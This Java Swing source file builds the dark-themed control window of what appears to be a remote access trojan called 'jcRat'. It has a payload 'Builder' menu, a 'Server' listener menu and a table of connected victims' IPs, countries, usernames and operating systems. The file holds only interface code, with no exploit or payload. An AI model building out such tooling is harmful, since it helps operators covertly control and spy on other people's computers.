package GUI;


import GUI.Compiler.CompilerGUI;
import GUI.Server.ServerGUI;
import GUI.TableUtils.Configuration.StateColumnRenderer;
import GUI.TableUtils.Configuration.TableModel;
import GUI.TableUtils.Configuration.TablePopUpListener;
import com.formdev.flatlaf.FlatDarkLaf;


import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;


public class SplinterGUI {

    private final String[] column = {"IP", "Country", "Tag", "Username", "Operating System", "Status"};
    private JPanel mainPanel;
    private JTable connectionsTable;
    private JFrame mainGUI;

    private final JLabel listeningPort = new JLabel();

    private final GridBagConstraints gridBagConstraints = new GridBagConstraints();

    public SplinterGUI() {
        loadStyle();
        setUpFrame();
        addComps();
    }


    private void setUpFrame() {
        mainGUI = new JFrame("jcRat Interface");
        mainGUI.setSize(new Dimension(800, 400));
        mainGUI.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        mainGUI.setLocationRelativeTo(null);

    }

    private void loadStyle() {
        FlatDarkLaf.setup();
        UIManager.put("Component.focusedBorderColor", new Color(55, 55, 55));
    }


    private void addJMenu(){
        JMenuBar menuBar = new JMenuBar();

        JMenu builderMenu = new JMenu("Builder");
        builderMenu.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                new CompilerGUI(mainGUI);
            }
        });
        menuBar.add(builderMenu);

        JMenu serverBar = new JMenu("Server");
        serverBar.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                new ServerGUI(mainGUI);
            }
        });
        menuBar.add(serverBar);


        mainGUI.setJMenuBar(menuBar);
    }

    private void addJPanel() {
        mainPanel = new JPanel();
        mainPanel.setLayout(new GridBagLayout());
    }

    private void addComps() {
        // Menu
        addJMenu();
        //
        // Panel
        addJPanel();
        //
        // JTable
        setupTable();
        //

        mainGUI.setVisible(true);
    }



    private void addTable() {
        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 0;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagConstraints.weightx = 1.0;
        gridBagConstraints.weighty = 1.0;
        gridBagConstraints.fill = GridBagConstraints.BOTH;
        TableModel tableModel = new TableModel(column);
        connectionsTable = new JTable(tableModel);
        JScrollPane tableScroll = new JScrollPane(connectionsTable);
        connectionsTable.setFocusable(false);
        connectionsTable.addMouseListener(new TablePopUpListener(this));
        mainPanel.add(tableScroll, gridBagConstraints);
        mainGUI.add(mainPanel);
    }

    private void addBottomPanel() {
        gridBagConstraints.gridx = 0;
        gridBagConstraints.gridy = 4;
        gridBagConstraints.gridwidth = 1;
        gridBagConstraints.gridheight = 1;
        gridBagConstraints.weightx = 1.0;
        gridBagConstraints.weighty = 0.02;
        gridBagConstraints.fill = GridBagConstraints.HORIZONTAL;

        JPanel bottomInformationPanel = new JPanel();
        bottomInformationPanel.setLayout(new BorderLayout());

        ServerGUI.changeColorAndStateOfPortInformation(listeningPort);
        listeningPort.setForeground(new Color(135, 135, 135));

        listeningPort.setBorder(new EmptyBorder(1, 4, 1, 8));

        bottomInformationPanel.add(listeningPort, BorderLayout.LINE_END);
        mainPanel.add(bottomInformationPanel, gridBagConstraints);


    }

    private void setupTable() {
        addTable();
        styleTable();
        addBottomPanel();
    }

    private void styleTable() {
        StateColumnRenderer columnRenderer = new StateColumnRenderer();

        DefaultTableCellRenderer alignRenderer = new DefaultTableCellRenderer();
        alignRenderer.setHorizontalAlignment(JLabel.CENTER);

        for (int x = 0; x < connectionsTable.getColumnCount(); x++) {
            if (x == connectionsTable.getColumnCount() - 1) {
                connectionsTable.getColumnModel().getColumn(x).setCellRenderer(columnRenderer);
            } else {
                connectionsTable.getColumnModel().getColumn(x).setCellRenderer(alignRenderer);
            }
        }

    }


    public JFrame getMainGUI() {
        return mainGUI;
    }

    public JTable getConnectionsTable() {
        return connectionsTable;
    }

    public DefaultTableModel getConnectionsDefaultTableModel() {
        return (DefaultTableModel) connectionsTable.getModel();
    }

    public JLabel getListeningPort() {
        return listeningPort;
    }
}